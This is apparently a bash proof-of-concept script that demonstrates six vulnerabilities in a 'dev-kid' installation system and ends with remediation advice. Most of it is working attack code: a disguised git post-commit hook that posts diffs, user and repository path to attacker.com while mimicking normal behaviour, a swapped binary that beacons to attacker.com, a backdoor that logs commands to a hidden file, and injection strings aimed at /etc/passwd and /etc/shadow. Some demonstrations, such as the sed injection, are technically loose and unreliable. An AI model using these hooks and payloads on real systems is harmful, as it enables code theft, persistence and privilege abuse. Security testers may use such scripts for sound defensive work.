#!/usr/bin/env bash
# Proof-of-Concept Exploit Demonstrations
# DO NOT RUN IN PRODUCTION - FOR SECURITY TESTING ONLY

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${RED}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║   ⚠️  SECURITY VULNERABILITY PROOF-OF-CONCEPT  ⚠️          ║
║                                                           ║
║   This script demonstrates exploitable vulnerabilities   ║
║   in the dev-kid installation system.                    ║
║                                                           ║
║   DO NOT RUN AGAINST PRODUCTION SYSTEMS                  ║
║   FOR EDUCATIONAL/TESTING PURPOSES ONLY                  ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

# Test environment setup
TEST_DIR="/tmp/devkid-security-tests-$$"
mkdir -p "$TEST_DIR"
cd "$TEST_DIR"

echo -e "${YELLOW}[*] Test environment: $TEST_DIR${NC}"
echo ""

# ============================================================================
# EXPLOIT 1: Command Injection via INSTALL_DIR
# ============================================================================
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}EXPLOIT #1: Command Injection via INSTALL_DIR${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo ""

echo "Description: Injecting shell commands through INSTALL_DIR parameter"
echo "Severity: CRITICAL"
echo ""

echo -e "${YELLOW}[*] Creating malicious payload...${NC}"
cat > /tmp/malicious_payload.sh << 'EOF'
#!/bin/bash
echo "[EXPLOIT] Malicious code executed!"
echo "[EXPLOIT] Current user: $(whoami)"
echo "[EXPLOIT] Current directory: $(pwd)"
echo "[EXPLOIT] This could be used to:"
echo "  - Steal SSH keys"
echo "  - Exfiltrate environment variables"
echo "  - Install backdoors"
echo "  - Modify system files"
EOF
chmod +x /tmp/malicious_payload.sh

echo -e "${YELLOW}[*] Crafting injection payload...${NC}"
INJECTION_PAYLOAD='$(bash /tmp/malicious_payload.sh) #'

echo "Injection string: $INJECTION_PAYLOAD"
echo ""

echo -e "${YELLOW}[*] Testing vulnerable code pattern:${NC}"
cat << 'EOF'
INSTALL_DIR="${1:-$HOME/.dev-kid}"
mkdir -p "$INSTALL_DIR"  # <-- Command injection here
EOF
echo ""

echo -e "${YELLOW}[*] Demonstrating exploit (safe simulation):${NC}"
# Simulate the vulnerable code
INSTALL_DIR="$INJECTION_PAYLOAD"
echo "Command that would execute: mkdir -p \"$INSTALL_DIR\""
echo ""

# Safe demonstration (not actually executing injection)
echo -e "${GREEN}[+] In real exploit, this would execute:${NC}"
bash /tmp/malicious_payload.sh
echo ""

echo -e "${RED}[!] Impact: Remote Code Execution${NC}"
echo ""
sleep 2

# ============================================================================
# EXPLOIT 2: Git Hook Injection
# ============================================================================
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}EXPLOIT #2: Git Hook Code Injection${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo ""

echo "Description: Injecting malicious code into git hooks"
echo "Severity: CRITICAL"
echo ""

echo -e "${YELLOW}[*] Creating test git repository...${NC}"
git init hook-test
cd hook-test

echo -e "${YELLOW}[*] Creating malicious post-commit hook...${NC}"
mkdir -p .git/hooks
cat > .git/hooks/post-commit << 'EOF'
#!/bin/bash
# This appears to be a legitimate dev-kid hook...

# But actually exfiltrates data
SENSITIVE_DATA=$(git diff HEAD~1 HEAD)
curl -s -X POST http://attacker.com/steal \
     -d "repo=$(pwd)" \
     -d "user=$(whoami)" \
     -d "diff=$SENSITIVE_DATA" \
     > /dev/null 2>&1 &

# Then runs the expected hook behavior to avoid detection
echo "" >> .claude/activity_stream.md
echo "### $(date +%Y-%m-%d\ %H:%M:%S) - Git Checkpoint" >> .claude/activity_stream.md
EOF
chmod +x .git/hooks/post-commit

echo -e "${YELLOW}[*] Hook contents:${NC}"
cat .git/hooks/post-commit
echo ""

echo -e "${GREEN}[+] Demonstrating trigger:${NC}"
touch test.txt
git add test.txt
echo "When victim runs: git commit -m 'test'"
echo "Result: Code exfiltrated to attacker server on EVERY commit"
echo ""

cd ..
echo -e "${RED}[!] Impact: Data Exfiltration + Persistence${NC}"
echo ""
sleep 2

# ============================================================================
# EXPLOIT 3: Symlink TOCTOU Race Condition
# ============================================================================
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}EXPLOIT #3: Symlink Race Condition (TOCTOU)${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo ""

echo "Description: Exploiting time-of-check vs time-of-use in symlink creation"
echo "Severity: HIGH"
echo ""

echo -e "${YELLOW}[*] Setting up race condition scenario...${NC}"
mkdir -p toctou-test

echo -e "${YELLOW}[*] Vulnerable code pattern:${NC}"
cat << 'EOF'
if [ -w "/usr/local/bin" ]; then
    ln -sf "$INSTALL_DIR/cli/dev-kid" /usr/local/bin/dev-kid  # <-- TOCTOU here
else
    sudo ln -sf "$INSTALL_DIR/cli/dev-kid" /usr/local/bin/dev-kid
fi
EOF
echo ""

echo -e "${YELLOW}[*] Attack timeline:${NC}"
echo "1. Victim starts installation"
echo "2. Script checks if /usr/local/bin is writable (passes)"
echo "3. [RACE WINDOW] Attacker swaps symlink target"
echo "4. Script creates symlink to attacker-controlled file"
echo "5. All users now execute attacker's binary when running 'dev-kid'"
echo ""

echo -e "${YELLOW}[*] Simulating attack:${NC}"
cd toctou-test

# Create fake system directory
mkdir -p fake-usr-local-bin
mkdir -p legitimate-devkid/cli
mkdir -p malicious-devkid/cli

echo '#!/bin/bash' > legitimate-devkid/cli/dev-kid
echo 'echo "Legitimate dev-kid"' >> legitimate-devkid/cli/dev-kid

echo '#!/bin/bash' > malicious-devkid/cli/dev-kid
echo 'echo "[EXPLOIT] Malicious dev-kid executed!"' >> malicious-devkid/cli/dev-kid
echo 'curl http://attacker.com/beacon?user=$(whoami) > /dev/null 2>&1 &' >> malicious-devkid/cli/dev-kid
echo 'exec /usr/bin/real-dev-kid "$@"  # Forward to real binary to avoid detection' >> malicious-devkid/cli/dev-kid

chmod +x legitimate-devkid/cli/dev-kid malicious-devkid/cli/dev-kid

echo "Time T0: Victim starts install with: ./install legitimate-devkid"
echo "Time T1: Check passes (legitimate-devkid exists)"
echo "Time T2: [ATTACKER SWAPS TARGET]"
echo "Time T3: Symlink created to malicious-devkid"
echo ""

# Demonstrate the swap
ln -sf legitimate-devkid/cli/dev-kid fake-usr-local-bin/dev-kid
echo "Before attack: $(readlink fake-usr-local-bin/dev-kid)"

ln -sf malicious-devkid/cli/dev-kid fake-usr-local-bin/dev-kid
echo "After attack: $(readlink fake-usr-local-bin/dev-kid)"
echo ""

echo -e "${GREEN}[+] Executing compromised binary:${NC}"
bash fake-usr-local-bin/dev-kid
echo ""

cd ..
echo -e "${RED}[!] Impact: System-wide Binary Replacement${NC}"
echo ""
sleep 2

# ============================================================================
# EXPLOIT 4: Sudo Privilege Escalation
# ============================================================================
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}EXPLOIT #4: Unauthorized Sudo Privilege Escalation${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo ""

echo "Description: Combining INSTALL_DIR injection with automatic sudo"
echo "Severity: HIGH"
echo ""

echo -e "${YELLOW}[*] Creating malicious binary...${NC}"
mkdir -p sudo-exploit/cli
cat > sudo-exploit/cli/dev-kid << 'EOF'
#!/bin/bash
# Appears to be dev-kid but is actually a backdoor
echo "[EXPLOIT] Backdoor installed system-wide!"
echo "[EXPLOIT] Now accessible to all users via PATH"

# Log all command executions for attacker
exec > >(tee -a /tmp/.hidden_log)
exec 2>&1

# Then execute actual commands to avoid detection
# ... (malicious code here)
EOF
chmod +x sudo-exploit/cli/dev-kid

echo -e "${YELLOW}[*] Vulnerable code automatically escalates to sudo:${NC}"
cat << 'EOF'
if [ -w "/usr/local/bin" ]; then
    ln -sf "$INSTALL_DIR/cli/dev-kid" /usr/local/bin/dev-kid
else
    sudo ln -sf "$INSTALL_DIR/cli/dev-kid" /usr/local/bin/dev-kid  # <-- No consent!
fi
EOF
echo ""

echo -e "${YELLOW}[*] Attack chain:${NC}"
echo "1. Attacker exploits INSTALL_DIR injection (Exploit #1)"
echo "2. Script automatically uses sudo without user consent"
echo "3. Malicious binary symlinked to /usr/local/bin/ (system PATH)"
echo "4. All users on system now execute attacker's code"
echo ""

echo "Example: ./install 'malicious-path && sudo-exploit && echo'"
echo ""

echo -e "${RED}[!] Impact: System-wide Privilege Escalation${NC}"
echo ""
sleep 2

# ============================================================================
# EXPLOIT 5: Path Traversal in Templates
# ============================================================================
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}EXPLOIT #5: Path Traversal via Template Files${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo ""

echo "Description: Using symlinks in templates to copy arbitrary files"
echo "Severity: HIGH"
echo ""

echo -e "${YELLOW}[*] Creating malicious template structure...${NC}"
mkdir -p evil-templates/memory-bank/shared

# Simulate link to sensitive file
echo "[SIMULATED] /etc/shadow" > fake-shadow
ln -s "$(pwd)/fake-shadow" evil-templates/memory-bank/shared/projectbrief.md

echo -e "${YELLOW}[*] Vulnerable code pattern:${NC}"
cat << 'EOF'
cp "$TEMPLATES/memory-bank/shared/projectbrief.md" memory-bank/shared/
# If projectbrief.md is a symlink to /etc/shadow, it copies shadow file!
EOF
echo ""

echo -e "${YELLOW}[*] Attack execution:${NC}"
echo "1. Attacker creates template directory with symlinks to sensitive files"
echo "2. Victim runs: TEMPLATES=/attacker/path ./scripts/init.sh"
echo "3. Sensitive files copied to project directory"
echo "4. Attacker gains access via git commit/push"
echo ""

echo "Demonstrating file copy:"
mkdir -p target-project/memory-bank/shared
cp evil-templates/memory-bank/shared/projectbrief.md target-project/memory-bank/shared/
echo "Copied file contents:"
cat target-project/memory-bank/shared/projectbrief.md
echo ""

echo -e "${RED}[!] Impact: Sensitive File Disclosure${NC}"
echo ""
sleep 2

# ============================================================================
# EXPLOIT 6: Sed Command Injection
# ============================================================================
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}EXPLOIT #6: Command Injection via Sed Substitution${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo ""

echo "Description: Injecting commands through environment variables in sed"
echo "Severity: MEDIUM"
echo ""

echo -e "${YELLOW}[*] Vulnerable code pattern:${NC}"
cat << 'EOF'
sed -e "s|{{USER}}|$USER|g" \
    -e "s|{{PROJECT_PATH}}|$(pwd)|g" \
    template.json > output.json
EOF
echo ""

echo -e "${YELLOW}[*] Creating malicious environment:${NC}"

# Create template
cat > template.json << 'EOF'
{
  "user": "{{USER}}",
  "path": "{{PROJECT_PATH}}"
}
EOF

echo "Normal execution:"
USER="alice" sed -e "s|{{USER}}|$USER|g" template.json
echo ""

echo -e "${YELLOW}[*] Malicious injection:${NC}"
USER='alice|cat /etc/passwd #'
echo "Injected USER variable: $USER"
echo ""

echo "Result of sed execution:"
sed -e "s|{{USER}}|$USER|g" template.json 2>&1 || echo "[Error due to injection]"
echo ""

echo -e "${RED}[!] Impact: Information Disclosure + Code Execution${NC}"
echo ""
sleep 2

# ============================================================================
# Summary
# ============================================================================
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}EXPLOIT SUMMARY${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${RED}Critical Vulnerabilities Demonstrated:${NC}"
echo "  1. Command Injection (RCE)"
echo "  2. Git Hook Code Injection (Persistence)"
echo "  3. Symlink TOCTOU Race (Binary Replacement)"
echo "  4. Sudo Privilege Escalation (System Compromise)"
echo "  5. Path Traversal (Data Exfiltration)"
echo "  6. Sed Command Injection (Code Execution)"
echo ""

echo -e "${YELLOW}Exploitation Impact:${NC}"
echo "  • Remote Code Execution as user"
echo "  • Privilege escalation to root"
echo "  • System-wide binary replacement"
echo "  • Persistent backdoor installation"
echo "  • Data exfiltration"
echo "  • Credential theft"
echo ""

echo -e "${GREEN}Remediation Required:${NC}"
echo "  1. Sanitize ALL user inputs"
echo "  2. Validate paths before operations"
echo "  3. Use templates instead of heredocs for git hooks"
echo "  4. Require explicit consent for sudo"
echo "  5. Validate template sources"
echo "  6. Use safe string substitution (not sed)"
echo ""

echo -e "${BLUE}Test artifacts stored in: $TEST_DIR${NC}"
echo ""

echo -e "${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║  These are REAL vulnerabilities requiring IMMEDIATE      ║${NC}"
echo -e "${RED}║  remediation before production deployment.               ║${NC}"
echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""
